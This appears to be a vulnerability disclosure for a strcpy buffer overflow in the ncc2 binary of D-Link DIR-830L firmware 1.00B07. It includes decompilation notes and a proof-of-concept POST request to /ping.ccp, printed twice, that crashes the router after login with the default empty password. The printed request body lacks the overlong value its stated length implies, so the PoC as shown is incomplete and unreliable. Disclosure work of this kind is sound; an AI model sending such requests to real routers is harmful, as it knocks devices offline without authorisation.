# Summary
There is a buffer overflow vulnerability in `ncc2` binary file of D-Link DIR830LA1_FW100B07, which can lead to denial of service or potential command execution.

Fimware download link : 
https://legacyfiles.us.dlink.com/DIR-830L/REVA/FIRMWARE/DIR-830L_REVA_FIRMWARE_1.00B07.ZIP

# Details
Using IDA to decompile `ncc2` file,
vulnerable code:
![image](https://github.com/user-attachments/assets/31c4f61c-992a-4387-8f90-c8336f10b9cb)

Parameter `nextPage` can be directly input by user, and line 13 uses vulnerable function `strcpy`, which leads to buffer overflow.

Backtrack to find the call point:
![image](https://github.com/user-attachments/assets/287b09ac-1d7a-4e03-ac4e-49a609b8d2c5)

Essentially, it is come from `callback_ccp_ping`:
![image](https://github.com/user-attachments/assets/d5ae42e9-1a80-4e2c-92bc-62a23e065303)

According to the format, we construct the following payload:
```
ccp_act=cancelPing&nextPage=xxxx
```

Notice that `char v10[260]`, for the reason that we just give PoC, a large packet is ok.

PoC:

It should be noticed that:
1. **Login** first(Default empty password) to get your cookie.
2. Send the packet **twice**.

```html
POST /ping.ccp HTTP/1.1

Host: 192.168.0.1

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Connection: close

Referer: http://192.168.0.1/Home.html

Cookie: uid=DdK2d6Kq3d

If-Modified-Since: Mon, 18 Aug 2014 09:26:05 GMT

Content-Length: 28



ccp_act=cancelPing&

```

![image](https://github.com/user-attachments/assets/65e80287-95f1-45c2-a79e-812d55eb4539)

After sending it twice, you will find the denial of service:
![image](https://github.com/user-attachments/assets/daeda341-9cf8-4c8c-b995-6fbd6c2715bb)

![image](https://github.com/user-attachments/assets/688310ec-9028-4aec-9a41-7991df42ebc6)

![image](https://github.com/user-attachments/assets/93d33368-f509-4388-90b0-739dc9d0e775)


# PoC
```html
POST /ping.ccp HTTP/1.1

Host: 192.168.0.1

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Connection: close

Referer: http://192.168.0.1/Home.html

Cookie: uid=DdK2d6Kq3d

If-Modified-Since: Mon, 18 Aug 2014 09:26:05 GMT

Content-Length: 28



ccp_act=cancelPing&

```

![image](https://github.com/user-attachments/assets/daeda341-9cf8-4c8c-b995-6fbd6c2715bb)
